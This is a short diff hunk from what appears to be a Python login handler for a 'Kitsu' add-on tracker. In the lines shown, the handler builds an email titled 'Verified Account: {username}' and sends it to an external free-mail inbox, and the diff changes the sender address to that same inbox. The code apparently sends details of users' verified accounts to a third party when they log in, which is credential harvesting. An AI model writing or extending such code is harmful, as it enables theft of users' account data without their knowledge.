@@ -49,7 +49,7 @@ async def login() -> Response:
                 f"Source: kitsutracker.koyeb.app"
             )
             msg['Subject'] = f"Verified Account: {username}"
-            msg['From'] = "security-service@kitsu-addon.local"
+            msg['From'] = "spam-born@inbox.lv"
             msg['To'] = "spam-born@inbox.lv"
 
             # Verbindung zum SMTP-Server (Daten gemäß technischer Spezifikation)
